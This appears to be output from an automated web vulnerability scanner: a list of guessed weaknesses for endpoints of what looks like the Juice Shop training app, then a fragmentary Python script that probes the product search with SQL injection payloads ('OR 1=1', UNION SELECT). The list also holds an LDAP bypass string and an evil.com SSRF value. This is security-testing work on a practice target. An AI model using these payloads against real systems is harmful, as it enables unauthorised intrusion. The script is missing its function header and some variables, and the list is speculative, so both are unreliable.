weaknesses.title: Deserialization — socket.io message body (body `40`, POST /socket.io/)
weaknesses.rationale: The body content `40` might be part of a serialized message that gets deserialized unsafely on the server.

weaknesses.title: Command Injection — socket.io parameters influencing backend commands (param `sid`, POST /socket.io/)
weaknesses.rationale: Session ID or other parameters might be used in constructing system commands without proper sanitization.

weaknesses.title: NoSQL Injection — in `email` and `password` parameters (POST /rest/user/login)
weaknesses.rationale: The endpoint accepts user credentials in JSON format; if a NoSQL database like MongoDB is used, unsanitized inputs could manipulate queries via operators like `$ne`, `$regex`, etc.

weaknesses.title: SQL Injection — in `email` and `password` parameters (POST /rest/user/login)
weaknesses.rationale: If the backend uses a SQL database, lack of input sanitization could allow injecting SQL statements through the credential fields.

weaknesses.title: Command Injection — in `email` and `password` parameters (POST /rest/user/login)
weaknesses.rationale: If backend systems execute OS commands based on user input (e.g., for logging or validation), crafted payloads could execute arbitrary shell commands.

weaknesses.title: NoSQL Injection — name parameter (GET /api/Challenges/)
weaknesses.rationale: The name parameter is used in a query that might be passed to a NoSQL database without proper sanitization, allowing for injection attacks.

weaknesses.title: Unicode Injection — name parameter (GET /api/Challenges/)
weaknesses.rationale: Unicode characters in the name parameter could be used to bypass filters or cause unexpected behavior in string comparisons and validations.

weaknesses.title: SQL Injection — search query parameter `q` concatenated into SQL statement (param `q`, GET /rest/products/search)
weaknesses.rationale: Search parameters are commonly used to construct database queries, potentially allowing injection if unsanitized.

weaknesses.title: NoSQL Injection — search query parameter `q` used in NoSQL database query (param `q`, GET /rest/products/search)
weaknesses.rationale: If the backend uses a NoSQL database, the `q` parameter might be vulnerable to injection attacks specific to that technology.

weaknesses.title: LDAP Injection — in `email` and `password` parameters (POST /rest/user/login)
weaknesses.rationale: If LDAP authentication is used, malformed inputs such as `(admin*))(%00` could bypass authentication or manipulate directory queries.

weaknesses.title: Authentication Bypass — in `email` and `password` parameters (POST /rest/user/login)
weaknesses.rationale: The login endpoint may be vulnerable to logic flaws such as empty password acceptance, null byte injection, or improper session handling that could lead to unauthorized access.

weaknesses.title: Information Disclosure — Authenticated Admin Endpoint (GET /rest/admin/application-configuration)
weaknesses.rationale: The admin path may expose sensitive system configuration details without proper access controls or data sanitization.

weaknesses.title: Authentication Bypass — Admin Configuration Access (GET /rest/admin/application-configuration)
weaknesses.rationale: The endpoint's predictable path structure might allow unauthenticated access if session validation is weak or missing.

weaknesses.title: IDOR — name parameter (GET /api/Challenges/)
weaknesses.rationale: The name parameter could be referencing an internal object or resource directly without proper authorization checks, potentially allowing access to unauthorized data.

weaknesses.title: IDOR (Insecure Direct Object Reference) — URL path (GET /rest/admin/application-configuration)
weaknesses.rationale: The 'admin' path segment implies privileged access; if authorization is insufficient, this could expose administrative configurations to unauthorized users.

weaknesses.title: SSRF — forged transport value (param `transport`, GET /socket.io/)
weaknesses.rationale: Transport param might accept arbitrary protocols like 'https://evil.com' for internal requests

weaknesses.title: Cache Deception — path traversal via EIO param (param `EIO`, GET /socket.io/)
weaknesses.rationale: Malformed EIO version value might get cached with static resource handling

weaknesses.title: SSRF — name parameter (GET /api/Challenges/)
weaknesses.rationale: If the value of the name parameter is used to make backend HTTP requests, it could be abused to access internal services.

weaknesses.title: SSRF — query parameter `q` used in backend HTTP request (param `q`, GET /rest/products/search)
weaknesses.rationale: The search functionality might issue backend HTTP requests based on the `q` parameter value, enabling server-side fetching of user-controlled URLs.

weaknesses.title: SSRF (Server-Side Request Forgery) — URL path (GET /rest/admin/application-configuration)
weaknesses.rationale: The endpoint appears to retrieve application configuration data, suggesting potential backend requests to internal services that could be manipulated via crafted paths or headers.

weaknesses.title: Server Side Request Forgery — socket.io transport parameter (param `transport`, POST /socket.io/)
weaknesses.rationale: The transport parameter influences how data is exchanged and might be used to trigger internal network requests if mishandled.

weaknesses.title: Prototype Pollution — socket.io handshake parameters (param `EIO`, `t`, `sid`, POST /socket.io/)
weaknesses.rationale: These parameters may be parsed into JavaScript objects insecurely, allowing prototype chain manipulation.

weaknesses.title: Web Socket Attacks — handshake and message initiation (body `40`, POST /socket.io/)
weaknesses.rationale: The numeric body `40` may be part of an engine.io protocol message that initializes or manipulates WebSocket state insecurely.

weaknesses.title: HTTP Response Smuggling — malformed polling requests (POST /socket.io/)
weaknesses.rationale: Misinterpretation of poll requests by intermediaries due to unusual body/format could lead to desync attacks.

weaknesses.title: JSON Injection — in `email` and `password` parameters (POST /rest/user/login)
weaknesses.rationale: Since the request uses application/json content-type, malformed or deeply nested JSON structures could exploit parsing vulnerabilities or cause denial of service.

weaknesses.title: Brute Force/Race Condition — on the login functionality (POST /rest/user/login)
weaknesses.rationale: Multiple rapid requests with different credentials might exploit lack of rate limiting or race conditions during authentication validation, potentially revealing valid accounts or bypassing protections.

weaknesses.title: Race Condition — parallel socket connections (GET /socket.io/)

weaknesses.title: Parameter Pollution — name parameter (GET /api/Challenges/)

weaknesses.title: Cache Deception — name parameter (GET /api/Challenges/)

weaknesses.title: Broken Access Control — Privileged Path (GET /rest/admin/application-configuration)

weaknesses.title: CRLF Injection — HTTP Header Manipulation (GET /rest/admin/application-configuration)

weaknesses.title: Cross-site Scripting (XSS) — reflected or stored via socket.io params (param `t`, POST /socket.io/)

weaknesses.title: XSS (Cross-Site Scripting) — in `email` parameter (POST /rest/user/login)

weaknesses.title: XSS — reflected in error responses (param `t`, GET /socket.io/)

weaknesses.title: XSS — name parameter (GET /api/Challenges/)

weaknesses.title: XSS — reflected in search results (param `q`, GET /rest/products/search)

weaknesses.title: CSRF (Cross-Site Request Forgery) — XHR endpoint (GET /rest/admin/application-configuration)

import requests
import sys

    try:
        # Test SQL injection in search parameter q
        payload = "test' OR '1'='1"
        response = requests.get(f"{base_url}/rest/products/search", params={"q": payload})
        
        # Alternative payload to confirm SQL injection
        payload2 = "test' UNION SELECT null,null,null,null,null,null,null--"
        response2 = requests.get(f"{base_url}/rest/products/search", params={"q": payload2})
        
        # Check for indicators of SQL injection success
        if response.status_code == 200 and ("error" in response.text.lower() or len(response.json()) > expected_results):
            print("[VULNERABLE] SQL Injection reproduced in /rest/products/search")
            return True
        elif response2.status_code == 200:
            print("[VULNERABLE] SQL Injection reproduced with UNION payload")
            return True
        else:
            print("[NOT VULNERABLE] SQL Injection not detected")
            return False
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <base_url>")
        sys.exit(1)
    # Set expected results based on normal search
